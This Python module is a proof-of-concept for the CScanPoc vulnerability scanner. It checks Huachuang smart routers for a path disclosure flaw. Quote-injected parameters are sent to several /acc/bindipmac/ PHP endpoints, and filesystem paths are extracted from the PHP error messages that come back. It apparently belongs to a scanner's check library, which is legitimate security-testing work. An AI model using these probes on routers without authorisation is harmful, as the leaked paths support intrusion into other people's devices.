# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse
import re

class Vuln(ABVuln):
    poc_id = '35a416d3-5105-4a88-96d3-266f5953d706'
    name = '华创路由器 路径泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_TRAVERSAL # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        华创智能加速路由器，设计缺陷。导致路径泄露。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '华创路由器'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'd0a33ea1-2abf-4ad0-ae70-e6175eabd518'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            urls = [
                "/acc/bindipmac/static_arp_action.php?arpIf=1'",
                "/acc/bindipmac/static_arp_bind.php?arpName=1'",
                "/acc/bindipmac/static_arp_del.php?x=1&arpName=1'"
            ]
            path=[]
            for url in urls:
                url = self.target + url
                code, head, res, errorcode, finalurl = hh.http(url)
                m = re.search('in <b>([^<]+)</b>', res)
                if m:
                    if m.group(0) not in path:
                        path.append(m.group(0))

            url = self.target + '/acc/bindipmac/check_arp_exist_ip.php'
            data = "eth=1'&ip=1"
            _, _, res, _, _ = hh.http(url,data)
            m = re.search('in <b>([^<]+)</b>', res)
            if m:
                if m.group(0) not in path:
                    path.append(m.group(0))
            if path:
                #security_note(str(path))
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
